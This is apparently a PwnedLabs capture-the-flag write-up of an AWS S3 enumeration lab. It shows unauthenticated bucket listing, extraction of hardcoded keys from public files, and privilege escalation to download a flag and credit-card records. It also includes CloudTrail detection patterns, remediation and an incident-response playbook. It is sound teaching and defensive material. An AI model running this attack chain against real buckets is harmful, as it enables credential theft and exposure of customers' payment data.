# AWS S3 Enumeration Basics — PwnedLabs Writeup
**Author:** Jashwanth | **Platform:** PwnedLabs | **Difficulty:** Beginner  
**Tags:** `AWS` `S3` `Enumeration` `Hardcoded Credentials` `IAM` `Privilege Escalation` `Data Exfiltration`   
**Lab URL:** https://pwnedlabs.io/labs/aws-s3-enumeration-basics

---

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. All commands were run inside a sanctioned lab environment. Never use these techniques against systems you don't own or have explicit permission to test.

---

## Table of Contents
1. [Scenario](#1-scenario)
2. [Tools Used](#2-tools-used)
3. [Attack Path — What I Did Step by Step](#3-attack-path--what-i-did-step-by-step)
4. [Blue Team — How to Detect This Attack](#4-blue-team--how-to-detect-this-attack)
5. [Root Cause Analysis](#5-root-cause-analysis)
6. [Remediation](#6-remediation)
7. [Real-World Playbook — If This Happens at Your Company](#7-real-world-playbook--if-this-happens-at-your-company)
8. [Real-World Breach Connection](#8-real-world-breach-connection)
9. [Key Takeaways](#9-key-takeaways)
10. [References](#10-references)

---

## 1. Scenario

**Company:** Huge Logistics (fictional)  
**Entry Point:** A website URL (`dev.huge-logistics.com`) found in a phished employee's bookmarks  
**Our Role:** Red Team — assess the target within the given scope

**Mission:**  
Starting from nothing but a URL, enumerate the target's AWS infrastructure, discover misconfigurations in their S3 bucket, extract leaked credentials hidden inside publicly accessible files, and use those credentials to escalate privileges and access restricted data.

**In plain English:**  
The company's development website is hosted on an S3 bucket. That bucket is partially public. Inside a publicly accessible folder sits a zip file containing a PowerShell script — and that script has AWS credentials hardcoded in plaintext. Using those credentials, we escalate to a higher-privilege IAM user and steal sensitive data including a flag and plaintext credit card records.

**Attack Chain at a Glance:**
```
[Website Recon] → [S3 Bucket Discovery] → [Unauthenticated Enumeration]
    → [Public Shared Folder Access] → [Hardcoded Credential Extraction]
        → [Authenticated Enumeration] → [Migration File Access]
            → [IT Admin Credential Extraction] → [Restricted Admin Folder Access]
                → [Flag + PII/Credit Card Data Exfiltrated] 
```

---

## 2. Tools Used

| Tool | Purpose |
|------|---------|
| Browser + Wappalyzer | Technology fingerprinting, page source inspection |
| `ping` | Initial host reconnaissance, AWS infrastructure identification |
| `aws s3 ls` | List S3 bucket contents (authenticated + unauthenticated) |
| `aws s3 cp` | Download files from S3 buckets |
| `aws s3api list-objects` | Enumerate all objects in a bucket with full metadata |
| `aws s3api get-bucket-policy` | Read bucket policy to understand access controls |
| `aws sts get-caller-identity` | Verify current IAM identity (the AWS `whoami`) |
| `aws configure` | Set up AWS CLI profiles with discovered credentials |
| `unzip` | Extract the zip file from the shared folder |
| `cat` | Read extracted file contents (PowerShell script, XML) |

---

## 3. Attack Path — What I Did Step by Step

### Step 1 — Initial Reconnaissance (Website + Infrastructure Fingerprinting)

Starting with the provided URL: `dev.huge-logistics.com`

**Browser inspection:**  
Opened the site, used Wappalyzer to fingerprint technologies — confirmed AWS infrastructure in use.

**Ping test:**
```bash
ping dev.huge-logistics.com
# PING s3-website.us-east-1.amazonaws.com (TARGET_IP)
```

>  The ping resolves to `s3-website.us-east-1.amazonaws.com` — this immediately tells us the site is **hosted on an S3 static website**, not a traditional web server. This is a critical recon finding.

**Page source inspection:**  
Viewed the HTML source. Found direct references to S3 bucket URLs including CSS and JS files being served from:

```
https://s3.amazonaws.com/dev.huge-logistics.com/
```

**Bucket name identified:** `dev.huge-logistics.com`

Also found an "Estimate Cost" feature on the site that returned an error — noted for later analysis. JS file further confirmed the bucket name.

---

### Step 2 — Unauthenticated S3 Bucket Enumeration

With the bucket name in hand, tried listing contents without any credentials:

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

**Output:**
```
PRE admin/
PRE migration-files/
PRE shared/
PRE static/
2023-10-16 14:00:47   5347 index.html
```

>  `--no-sign-request` tells the AWS CLI to skip authentication entirely. If a bucket returns results with this flag, it means it's **publicly readable** — one of the most common S3 misconfigurations.

**Four folders found:** `admin/`, `migration-files/`, `shared/`, `static/`

Now listing each folder:

```bash
# Try admin/ folder
aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request
# Result: AccessDenied 

# Try migration-files/ folder
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
# Result: AccessDenied 

# Try shared/ folder
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
# Result: SUCCESS 
```

**Output from shared/:**
```
2023-10-16 09:08:33         0
2023-10-16 09:09:01       993 hl_migration_project.zip
```

> A zip file in a **publicly accessible shared folder** — this is immediately suspicious.

```bash
# Try static/ folder
aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
# Returns: CSS, JS, PNG assets — standard frontend files, nothing sensitive
```

---

### Step 3 — Download and Extract the Zip File

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
unzip hl_migration_project.zip
```

**Contents of the zip:**
```
migrate_secrets.ps1    ← PowerShell script
```

Reading the script:

```bash
cat migrate_secrets.ps1
```

**Critical finding — hardcoded AWS credentials in plaintext:**
```powershell
# AWS Configuration
$accessKey = "AKIA3SFMDAPOYPM3X2TB7[snip]"
$secretKey = "MwGe3[snip]"
$region    = "us-east-1"
```

>  A developer committed AWS credentials directly into a PowerShell script, then zipped it and stored it in a public S3 folder. This is one of the most common and most damaging real-world misconfigurations.

---

### Step 4 — Configure AWS CLI with Leaked Credentials

```bash
aws configure --profile pwned_lab
# AWS Access Key ID: AKIA3SFMDAPOYPM3X2TB7[snip]
# AWS Secret Access Key: MwGe3[snip]
# Default region: us-east-1
# Output format: json
```

**Verify identity:**
```bash
aws sts get-caller-identity --profile pwned_lab
```

**Output:**
```json
{
  "UserId": "AIDA3SFMDAPOYPM3X2TB7",
  "Account": "794929857501",
  "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

We are now authenticated as `pam-test`.

---

### Step 5 — Authenticated Enumeration

With credentials, check the bucket policy to understand access controls:

```bash
aws s3api get-bucket-policy --bucket dev.huge-logistics.com --profile pwned_lab
```

**Finding from the policy:**
```json
{
  "Sid": "ExplicitDenyAdminAccess",
  "Effect": "Deny",
  "Principal": {
    "AWS": "arn:aws:iam::794929857501:user/pam-test"
  },
  "Action": "s3:*",
  "Resource": "arn:aws:s3:::dev.huge-logistics.com/admin/*"
}
```

> `pam-test` is **explicitly denied** from accessing `admin/`. We need to escalate.

List all bucket objects to see everything:

```bash
aws s3api list-objects --bucket dev.huge-logistics.com --profile pwned_lab
```

**Now listing migration-files/ with auth:**
```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pwned_lab
```

**Output:**
```
2023-10-16 09:09:26  1833646  AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 09:09:25  1407180  AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 09:09:27     1853  migrate_secrets.ps1
2023-10-16 12:00:13     2494  test-export.xml
```

>  Ironically, this folder contains documents about **migrating to AWS Secrets Manager** — they were planning to fix the hardcoded credentials issue but hadn't done it yet. `test-export.xml` is the most interesting file.

---

### Step 6 — Extract IT Admin Credentials from XML

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwned_lab
cat test-export.xml
```

**Contents (sanitized):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
  <!-- Oracle Database Credentials -->
  <CredentialEntry>...</CredentialEntry>

  <!-- AWS Production Credentials -->
  <CredentialEntry>
    <ServiceType>AWS IT Admin</ServiceType>
    <AccessKey>AKIA[snip]</AccessKey>
    <SecretKey>[snip]</SecretKey>
  </CredentialEntry>
</CredentialsExport>
```

> **Another set of hardcoded credentials** — this time for the `AWS IT Admin` user. A credentials export file stored in plain XML inside an S3 bucket.

---

### Step 7 — Configure IT Admin Profile and Access Restricted Data

```bash
aws configure --profile it-admin
# AWS Access Key ID: AKIA[snip from XML]
# AWS Secret Access Key: [snip from XML]
# Default region: us-east-1
```

**Verify new identity:**
```bash
aws sts get-caller-identity --profile it-admin
# Confirms we are now the IT Admin user
```

**Access the restricted admin/ folder:**
```bash
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile it-admin
```

**Output:**
```
2023-10-16 09:08:38         0
2023-10-16 09:10:51        32 flag.txt
2023-10-16 14:24:07      2425 website_transactions_export.csv
```

**Download the flag and sensitive data:**
```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile it-admin
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile it-admin

cat flag.txt
# FLAG: [captured] 

cat website_transactions_export.csv
# Contains: Customer PII + plaintext credit card numbers 
```

**Full compromise achieved.** Customer payment data and sensitive credentials are in attacker hands.

---

## 4. Blue Team — How to Detect This Attack

### Detection Signal 1 — Unauthenticated S3 API Calls

```bash
# In CloudTrail, look for ListObjects/GetObject with no userIdentity
# These will show as "Anonymous" or have userIdentity.type = "AWSAccount" with no user
grep '"userIdentity"' *.json | grep -i "anonymous\|unauthenticated"
```

**Alert rule:** Any `ListObjects` or `GetObject` event from an unauthenticated principal on non-static folders.

### Detection Signal 2 — GetCallerIdentity from an Unexpected Profile

When an attacker gets credentials and uses them, one of the **first things they always do** is run `GetCallerIdentity`. Monitor for:

```bash
# CloudTrail filter
grep '"eventName": "GetCallerIdentity"' *.json | grep -v "expected-automation-role"
```

**Alert rule:** `GetCallerIdentity` from any IP that isn't in your known CI/CD or developer IP ranges.

### Detection Signal 3 — Credentials Accessed from Unexpected Location

The `pam-test` or `it-admin` users accessing S3 objects would show in CloudTrail with source IPs. If those IPs are:
- External / residential / VPN ranges
- Not matching known developer locations

That's an immediate IoC.

### Detection Signal 4 — S3 Object Access Pattern Anomaly

Normal user: accesses 2-3 files over days  
Attacker: downloads `flag.txt`, `website_transactions_export.csv`, `test-export.xml`, `hl_migration_project.zip` in rapid succession

```bash
# Find rapid bulk GetObject events from same user
grep '"eventName": "GetObject"' *.json | grep "pam-test\|it-admin" | sort -k timestamp
```

**Alert rule:** More than 5 `GetObject` calls from a single IAM user within 2 minutes → trigger IR.

### Detection Signal 5 — Access to Sensitive Filenames

```bash
grep '"objectKey"' *.json | grep -i "export\|credentials\|secrets\|password\|flag\|backup"
```

**Alert rule:** Any access to files matching sensitive naming patterns should auto-alert.

---

## 5. Root Cause Analysis

| # | Root Cause | Severity |
|---|-----------|---------|
| 1 | S3 bucket `shared/` folder publicly accessible with no authentication required |   Critical |
| 2 | AWS credentials hardcoded in `migrate_secrets.ps1` and stored in a public S3 folder |   Critical |
| 3 | AWS credentials for IT Admin stored in plaintext `test-export.xml` in S3 |   Critical |
| 4 | `website_transactions_export.csv` with customer PII and credit card data stored in S3 unencrypted |   Critical |
| 5 | No S3 server-side encryption enabled on sensitive objects |   High |
| 6 | No CloudTrail alerting on anonymous S3 access events |   High |
| 7 | `pam-test` user had `s3:ListBucket` on migration-files despite being a restricted user |   High |
| 8 | No secrets scanning in the development pipeline to catch hardcoded credentials |   High |
| 9 | PCI-DSS violation — credit card data stored in plaintext in an S3 bucket |   Critical + Legal |

---

## 6. Remediation

### Immediate 

```bash
# 1. Rotate ALL leaked credentials immediately
aws iam delete-access-key --user-name pam-test --access-key-id AKIA3SFMDAPOYPM3X2TB7
aws iam delete-access-key --user-name it-admin --access-key-id AKIA[snip]

# 2. Create new keys if the users are legitimate
aws iam create-access-key --user-name pam-test
aws iam create-access-key --user-name it-admin

# 3. Block all public access on the bucket immediately
aws s3api put-public-access-block \
  --bucket dev.huge-logistics.com \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# 4. Delete the exposed zip file and XML from S3
aws s3 rm s3://dev.huge-logistics.com/shared/hl_migration_project.zip
aws s3 rm s3://dev.huge-logistics.com/migration-files/test-export.xml

# 5. Check if any other files in the bucket were accessed
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=dev.huge-logistics.com \
  --start-time 2023-10-01T00:00:00Z
```

### Short-Term

**Move secrets to AWS Secrets Manager (the right fix):**
```bash
# Store the credentials properly — never in files
aws secretsmanager create-secret \
  --name "prod/huge-logistics/aws-it-admin" \
  --description "IT Admin AWS credentials" \
  --secret-string '{"AccessKey":"AKIA...","SecretKey":"..."}'

# Application retrieves at runtime — never hardcoded
aws secretsmanager get-secret-value --secret-id "prod/huge-logistics/aws-it-admin"
```

**Fix the bucket policy — enforce authentication for all non-static paths:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadOnlyForStaticAssets",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::dev.huge-logistics.com/static/*"
    },
    {
      "Sid": "DenyAllPublicAccessToOtherFolders",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::dev.huge-logistics.com/admin/*",
        "arn:aws:s3:::dev.huge-logistics.com/migration-files/*",
        "arn:aws:s3:::dev.huge-logistics.com/shared/*"
      ],
      "Condition": {
        "StringEquals": {"aws:PrincipalType": "Anonymous"}
      }
    }
  ]
}
```

**Enable S3 server-side encryption for all objects:**
```bash
aws s3api put-bucket-encryption \
  --bucket dev.huge-logistics.com \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms"
      }
    }]
  }'
```

### Long-Term

**1. Add secrets scanning to your CI/CD pipeline:**
```yaml
# GitHub Actions — runs on every PR
- name: Scan for hardcoded secrets
  uses: trufflesecurity/trufflehog@main
  with:
    path: ./
    base: ${{ github.event.repository.default_branch }}
```

**2. Enable AWS Config rule to detect public S3 buckets:**
```bash
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "s3-bucket-public-read-prohibited",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}'
```

**3. Enable Macie for automatic PII detection in S3:**
```bash
# AWS Macie would have flagged the credit card CSV automatically
aws macie2 enable-macie
aws macie2 create-classification-job \
  --job-type ONE_TIME \
  --s3-job-definition '{"bucketDefinitions": [{"accountId": "794929857501", "buckets": ["dev.huge-logistics.com"]}]}'
```

**4. Enforce MFA delete on S3 buckets with sensitive data:**
```bash
aws s3api put-bucket-versioning \
  --bucket dev.huge-logistics.com \
  --versioning-configuration Status=Enabled,MFADelete=Enabled \
  --mfa "arn:aws:iam::794929857501:mfa/admin-device 123456"
```

---

## 7. Real-World Playbook — If This Happens at Your Company

> This is your incident response guide. If your SOC pager fires at 2am with an alert matching this scenario — follow this.

### Detection Triggers (What Should Alert You)

| Signal | Source | Urgency |
|--------|--------|---------|
| Anonymous `ListObjects` on non-static S3 prefix | CloudTrail / S3 Access Logs |   Immediate |
| `GetCallerIdentity` called from an IP outside known ranges | CloudTrail |   Immediate |
| Bulk `GetObject` events (5+ files in <2 min) by single user | CloudTrail / CloudWatch Alarm |   Immediate |
| Access to files named `export`, `credentials`, `secrets`, `backup` | CloudTrail + Macie |   Immediate |
| AWS Macie PII finding in S3 object | AWS Macie |   High |
| S3 public access block disabled on any bucket | AWS Config |   High |
| New IAM access key created outside normal working hours | CloudTrail |   Medium |

### Incident Response Steps (Production)

```
1. SCOPE     → Identify ALL files accessed: grep GetObject events for the affected user + time window
2. CONTAIN   → Rotate leaked credentials, block public access on bucket immediately
3. PRESERVE  → Enable S3 Object Lock on all logs before investigation (immutable evidence)
4. ANALYSE   → Reconstruct full attack timeline from CloudTrail
5. ASSESS    → Determine what data was exfiltrated (PII? PCI? credentials? IP?)
6. NOTIFY    → Legal team if PII/PCI data was accessed (GDPR 72h notification, PCI DSS breach reporting)
7. REMEDIATE → Move all secrets to Secrets Manager, fix bucket policies, enable encryption
8. HARDEN    → Enable Macie, GuardDuty, AWS Config rules, add secrets scanning to pipelines
9. REVIEW    → Post-incident report, update runbooks, conduct developer security training
```

### Key AWS CLI Commands for Real IR

```bash
# Find all anonymous/unauthenticated S3 access in the last 7 days
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
  --start-time $(date -d '7 days ago' +%s) | grep -i anonymous

# Find all GetObject events for a specific bucket
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=dev.huge-logistics.com

# List all access keys across all IAM users (to identify leaked ones)
aws iam list-users --query 'Users[*].UserName' --output text | \
  xargs -I {} aws iam list-access-keys --user-name {}

# Check what objects were accessed by a specific user in a bucket
aws s3api list-objects --bucket dev.huge-logistics.com | \
  jq '.Contents[] | {Key, LastModified, Size}'

# Check if Macie is running
aws macie2 get-macie-session

# Check if S3 Block Public Access is enabled account-wide
aws s3control get-public-access-block --account-id $(aws sts get-caller-identity --query Account --output text)

# Find all S3 buckets without public access block
aws s3api list-buckets --query 'Buckets[*].Name' --output text | \
  xargs -I {} aws s3api get-public-access-block --bucket {} 2>/dev/null
```

---

## 8. Real-World Breach Connection

This lab mirrors multiple real-world incidents:

**Capital One (2019)** — An attacker exploited a misconfigured AWS environment to access S3 buckets containing over 100 million customer records. The root cause was overly permissive IAM roles and insufficient S3 access controls — the same class of misconfiguration demonstrated here.

**GrayKey / Multiple SaaS companies** — Hardcoded AWS credentials in public GitHub repositories or exposed configuration files have led to numerous data breaches. Tools like TruffleHog and GitLeaks exist specifically because this problem is so widespread.

**PCI DSS Implication** — The `website_transactions_export.csv` file containing plaintext credit card data in an S3 bucket is a direct PCI DSS violation. In a real breach, this would trigger mandatory reporting to card brands within 72 hours and could result in fines of $5,000–$100,000 per month.

>  **MITRE ATT&CK Mapping:**
> - T1530 — Data from Cloud Storage
> - T1552.001 — Credentials in Files
> - T1078.004 — Valid Accounts: Cloud Accounts

---

## 9. Key Takeaways

| # | Lesson | Apply Where |
|---|--------|------------|
| 1 | A `ping` response revealing `s3-website.amazonaws.com` = S3-hosted site, enumerate the bucket | Initial recon |
| 2 | Always try `--no-sign-request` on discovered S3 buckets — public access is more common than it should be | S3 enumeration |
| 3 | Zip files in shared/public folders are treasure chests — always extract and read every file | File analysis |
| 4 | Hardcoded credentials in scripts/config files is still the #1 credential exposure vector | Code review |
| 5 | XML export files from legacy systems almost always contain plaintext credentials | Migration projects |
| 6 | `GetCallerIdentity` first, always — understand your privilege context before acting | Every AWS engagement |
| 7 | An explicit Deny in a bucket policy means you need to find a different identity — escalate | IAM analysis |
| 8 | Page source and JS files often reveal bucket names, API endpoints, and internal hostnames | Web recon |
| 9 | Macie + S3 Block Public Access + Secrets Manager = the three controls that prevent this entire chain | Defensive hardening |

---

## 10. References

- [AWS S3 Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html)
- [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html)
- [AWS Macie — PII Detection in S3](https://docs.aws.amazon.com/macie/latest/user/what-is-macie.html)
- [AWS Config — S3 Public Read Prohibited Rule](https://docs.aws.amazon.com/config/latest/developerguide/s3-bucket-public-read-prohibited.html)
- [TruffleHog — Secrets Scanner](https://github.com/trufflesecurity/trufflehog)
- [MITRE ATT&CK — Data from Cloud Storage (T1530)](https://attack.mitre.org/techniques/T1530/)
- [MITRE ATT&CK — Credentials in Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/)
- [PwnedLabs — AWS S3 Enumeration Basics](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)

---

by Jashwanth | [GitHub](https://github.com/JashwanthMU) | Part of the `aws-cloud-security-labs` writeup series*
